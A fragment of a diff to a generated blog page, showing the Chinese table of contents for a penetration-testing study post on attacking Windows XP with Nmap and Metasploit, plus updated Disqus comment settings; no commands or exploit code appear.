+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#more"><span class="nav-number">1.</span> <span class="nav-text"></span></a></li></ol><li class="nav-item nav-level-1"><a class="nav-link" href="#null"><span class="nav-number"></span> <span class="nav-text">渗透过程</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-nmap扫描本地网络"><span class="nav-number">1.</span> <span class="nav-text">1.Nmap扫描本地网络</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-搜集目标信息"><span class="nav-number">2.</span> <span class="nav-text">2.搜集目标信息</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1获取目标的操作系统信息"><span class="nav-number">2.1.</span> <span class="nav-text">2.1获取目标的操作系统信息</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-利用metasploit的渗透攻击模块进行攻击"><span class="nav-number">3.</span> <span class="nav-text">3.利用Metasploit的渗透攻击模块进行攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-1-搜寻并加载模块"><span class="nav-number">3.1.</span> <span class="nav-text">3.1.搜寻并加载模块</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-2-设置必要的信息"><span class="nav-number">3.2.</span> <span class="nav-text">3.2.设置必要的信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-3-发起攻击"><span class="nav-number">3.3.</span> <span class="nav-text">3.3.发起攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-4-攻击载荷模块"><span class="nav-number">3.4.</span> <span class="nav-text">3.4.攻击载荷模块</span></a></li></ol></li></ol></li></div>
             
 
           </div>
@@ -827,9 +794,9 @@
     
       <script type="text/javascript">
         var disqus_config = function () {
-          this.page.url = 'https://zebra233.github.io/2019/08/03/渗透学习-1-了解渗透测试/';
-          this.page.identifier = '2019/08/03/渗透学习-1-了解渗透测试/';
-          this.page.title = '[渗透学习]1.了解渗透测试';
+          this.page.url = 'https://zebra233.github.io/2019/08/04/渗透学习-2-对Winxp的渗透攻击/';
+          this.page.identifier = '2019/08/04/渗透学习-2-对Winxp的渗透攻击/';
+          this.page.title = '[渗透学习]2.对Winxp的渗透攻击';
         };
         var d = document, s = d.createElement('script');
         s.src = 'https://<your-shortname>.disqus.com/embed.js';
